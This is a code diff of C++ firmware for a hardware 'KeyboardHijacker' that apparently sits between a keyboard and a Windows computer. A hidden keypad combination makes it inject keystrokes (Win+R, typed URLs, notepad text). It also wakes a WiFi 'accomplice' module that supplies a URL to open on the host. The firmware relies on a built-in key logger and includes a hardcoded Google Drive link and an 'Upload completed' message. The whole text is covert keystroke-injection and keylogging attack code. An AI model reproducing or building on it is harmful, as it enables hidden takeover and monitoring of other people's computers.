@@ -3,6 +3,11 @@
 
 
 
+#define HIJACKER_OPENS_WEBPAGE__OS_WINDOWS(URL) { pressandreleaseMultiKey({KEY_GUI,KEY_R}); delay(1000); pressandreleaseKeys(URL); delay(1000); pressandreleaseKey(KEY_ENTER); }
+#define HIJACKER_OPENS_NOTEPAD__OS_WINDOWS(STR) { pressandreleaseMultiKey({KEY_GUI,KEY_R}); delay(1000); pressandreleaseKeys("notepad"); delay(1000); pressandreleaseKey(KEY_ENTER); delay(1000); pressandreleaseKeys_LikeHuman(STR); }
+
+
+
 void KeyboardHijacker::TRANSMIT_AFTER_HIJACK()
 {
     isActivatedKeyEvent=true;
@@ -27,107 +32,89 @@ void KeyboardHijacker::TRANSMIT_AFTER_HIJACK()
 
 
 
-    // HIJACKER's function Key Events,
-    if(!stateNumLockToggle && numDN==3)
+    // HIJACKER's Function Key Events
+    if  (   numDN==3
+            &&  (   (KBD_PARSER.KeyLogger.peek_keycode(2)==KEYCODE_KEYPAD_SLASH && KBD_PARSER.KeyLogger.peek_keycode(1)==KEYCODE_KEYPAD_0) ||
+                    (KBD_PARSER.KeyLogger.peek_keycode(2)==KEYCODE_KEYPAD_0     && KBD_PARSER.KeyLogger.peek_keycode(1)==KEYCODE_KEYPAD_SLASH)   )
+        )
     {
-        if( (KBD_PARSER.KeyLogger.peek_keycode(1)==KEYCODE_KEYPAD_SLASH && KBD_PARSER.KeyLogger.peek_keycode(2)==KEYCODE_KEYPAD_0) ||
-            (KBD_PARSER.KeyLogger.peek_keycode(1)==KEYCODE_KEYPAD_0     && KBD_PARSER.KeyLogger.peek_keycode(2)==KEYCODE_KEYPAD_SLASH) )
+        switch(key)
         {
-            #define HIJACKER_OPENS_WEBPAGE__OS_WINDOWS(URL) { pressandreleaseMultiKey({KEY_GUI,KEY_R}); delay(1000); pressandreleaseKeys(URL); delay(1000); pressandreleaseKey(KEY_ENTER); }
-            #define HIJACKER_OPENS_NOTEPAD__OS_WINDOWS(STR) { pressandreleaseMultiKey({KEY_GUI,KEY_R}); delay(1000); pressandreleaseKeys("notepad"); delay(1000); pressandreleaseKey(KEY_ENTER); delay(1000); pressandreleaseKeys_LikeHuman(STR); }
-
-            switch(key)
+            case KEY_BACKSPACE:
             {
-                case KEY_BACKSPACE:
+                if(event)
                 {
-                    if(event)
-                    {
-                        releaseAllBeingHoldDownKey();
-                        while(numDN){ delay(1); }
+                    releaseAllBeingHoldDownKey();
+                    while(numDN){ delay(1); }
 
-                        if(DarkJunction::STATE == DarkJunction_STATE_DISCONNECTED)
+                    if(DarkJunction::STATE == DarkJunction_STATE_DISCONNECTED)
+                    {
+                        // WAKE UP WIFI_ACCOMPLICE !
+                        WIFI_ACCOMPLICE_WAKEUP();
+
+                        // if WIFI_ACCOMPLICE all ready, it signals.
+                        if(DarkJunction::detectHIGHForXXms(15000, false))
                         {
-                            // WAKE UP WIFI_ACCOMPLICE !
-                            WIFI_ACCOMPLICE_WAKEUP();
+                            DarkJunction::BOOT();
+                            DarkJunction::S3R14L_download();
 
-                            // if WIFI_ACCOMPLICE all ready, it signals.
-                            if(DarkJunction::detectHIGHForXXms(15000, false))
-                            {
-                                DarkJunction::BOOT();
-                                DarkJunction::S3R14L_download();
+                            static String url = "";
 
-                                static String url = "";
-
-                                if((url=DarkJunction::getMessage()).length() > 0) {
-                                    HIJACKER_OPENS_WEBPAGE__OS_WINDOWS(url);
-                                    if(isDEBUG) Serial.println("\nWIFI_ACCOMPLICE url : " + url + "\n");
-                                }
-                                else
-                                    HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("SERIAL POLLING ERROR");
+                            if((url=DarkJunction::getMessage()).length() > 0) {
+                                HIJACKER_OPENS_WEBPAGE__OS_WINDOWS(url);
+                                if(isDEBUG) Serial.println("\nWIFI_ACCOMPLICE url : " + url + "\n");
                             }
-                            // if WIFI_ACCOMPLICE's WIFI is not connected to NET yet, please connect...
                             else
-                            {
-                                HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("PLEASE CONNECT WIFI_ACCOMPLICE TO NET PLEASE");
-                            }
+                                HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("SERIAL POLLING ERROR");
                         }
+                        // if WIFI_ACCOMPLICE's WIFI is not connected to NET yet, please connect...
                         else
-                        {   DarkJunction::SHUTDOWN(); WIFI_ACCOMPLICE_PUTTOSLEEP();   }
+                        {
+                            HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("PLEASE CONNECT WIFI_ACCOMPLICE TO NET PLEASE");
+                        }
                     }
-                    isActivatedKeyEvent=false; key=KEY_NONE;
+                    else
+                    {   DarkJunction::SHUTDOWN(); WIFI_ACCOMPLICE_PUTTOSLEEP();   }
                 }
-                break;
-
-                case KEYPAD_MINUS:
-                {
-                    if(event)
-                    {
-                        releaseAllBeingHoldDownKey(); delay(10);
-
-                        ;
-                    }
-                    isActivatedKeyEvent=false; key=KEY_NONE;
-                }
-                break;
-
-                case KEYPAD_PLUS:
-                {
-                    if(event)
-                    {
-                        releaseAllBeingHoldDownKey(); delay(10);
-
-                        ;
-                    }
-                    isActivatedKeyEvent=false; key=KEY_NONE;
-                }
-                break;
-
-                case KEYPAD_7:
-                {
-                    if(event)
-                    {
-                        releaseAllBeingHoldDownKey(); delay(10);
-
-                        HIJACKER_OPENS_WEBPAGE__OS_WINDOWS("https://drive.google.com/file/d/1jy5C9P_xP0G-GG9I29iKfttaGfzxMcIq/view");
-                    }
-                    isActivatedKeyEvent=false; key=KEY_NONE;
-                }
-                break;
-
-                // case KEYPAD_8 is REBOOT COMMAND
-
-                case KEYPAD_9:
-                {
-                    if(event)
-                    {
-                        releaseAllBeingHoldDownKey(); delay(10);
-
-                        HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("Upload completed~ " + String(__TIMESTAMP__));
-                    }
-                    isActivatedKeyEvent=false; key=KEY_NONE;
-                }
-                break;
+                isActivatedKeyEvent=false; key=KEY_NONE;
             }
+            break;
+
+            // case KEYPAD_ASTERIX:
+            // {
+            //     if(event)
+            //     {
+            //         releaseAllBeingHoldDownKey(); delay(10);
+
+            //         ;
+            //     }
+            //     isActivatedKeyEvent=false; key=KEY_NONE;
+            // }
+            // break;
+
+            // case KEYPAD_MINUS:
+            // {
+            //     if(event)
+            //     {
+            //         releaseAllBeingHoldDownKey(); delay(10);
+
+            //         ;
+            //     }
+            //     isActivatedKeyEvent=false; key=KEY_NONE;
+            // }
+            // break;
+
+            case KEYPAD_PLUS:
+            {
+                if(event)
+                {
+                    releaseAllBeingHoldDownKey(); delay(10);
+
+                    HIJACKER_OPENS_NOTEPAD__OS_WINDOWS("Upload completed~ " + String(__TIMESTAMP__));
+                }
+                isActivatedKeyEvent=false; key=KEY_NONE;
+            }
+            break;
         }
     }
 
